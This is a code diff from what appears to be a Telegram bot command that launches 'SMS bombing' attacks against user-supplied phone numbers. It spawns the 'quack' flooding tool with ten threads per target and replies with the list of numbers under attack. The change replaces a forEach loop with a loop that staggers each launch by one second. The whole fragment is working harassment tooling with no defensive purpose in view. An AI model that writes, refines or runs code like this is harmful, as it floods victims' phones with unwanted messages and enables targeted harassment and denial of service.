@@ -23,10 +23,12 @@ module.exports = {
                     ctx.reply(`Started SMS bombing on ${numbers_filtered.join(', ')}`);
                 }
 
-                numbers_filtered.forEach(element => {
-                    const ls = spawn("quack", ["--tool", "sms", "--target", element, "--timeout", args[1], "--threads", "10"]);
-                    executeBombing(ls);
-                })
+                for(let i=0; i<numbers_filtered.length; i++){
+                    const ls = spawn("quack", ["--tool", "sms", "--target", numbers_filtered[i], "--timeout", args[1], "--threads", "10"]);
+                    setTimeout(function(){
+                        executeBombing(ls);
+                    }, i * 1000)
+                }
             })
         }
 
